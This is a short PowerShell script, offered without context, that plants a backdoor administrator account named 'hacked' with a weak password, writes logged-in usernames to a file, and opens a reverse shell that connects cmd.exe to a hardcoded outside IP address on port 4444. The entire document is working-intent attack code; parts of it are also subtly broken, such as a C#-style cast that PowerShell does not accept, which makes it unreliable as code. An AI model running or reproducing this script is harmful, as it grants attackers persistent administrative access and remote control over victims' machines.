# Create a new user account
New-LocalUser   -Name "hacked" -Description "Hacked User" -Password (ConvertTo-SecureString "12345" -AsPlainText -Force)

# Add the user to the local Administrators group
Add-LocalGroupMember -Group "Administrators" -Member "hacked"

# Set the user's email address
Set-LocalUser -Name "hacked" -EmailAddress "hacked@hacked.com"

Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName | Out-File -FilePath "C:/online_users.txt"

$ip = "217.160.74.6"
$port = 4444

# Create a new TCP client
$tcpClient = New-Object System.Net.Sockets.TcpClient

# Connect to the remote host
$tcpClient.Connect($ip, $port)

# Create a new stream
$stream = $tcpClient.GetStream()

# Create a new process
$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = "cmd.exe"
$process.StartInfo.UseShellExecute = $false
$process.StartInfo.RedirectStandardInput = $true
$process.StartInfo.RedirectStandardOutput = $true
$process.Start()

# Redirect the input and output streams
while ($true) {
    $input = $stream.ReadByte()
    if ($input -eq -1) { break }
    $process.StandardInput.Write((char)$input)
    $process.StandardInput.Flush()
    $output = $process.StandardOutput.BaseStream.ReadByte()
    $stream.Write($output, 0, 1)
    $stream.Flush()
}

# Close the streams and the process
$stream.Close()
$process.Close()
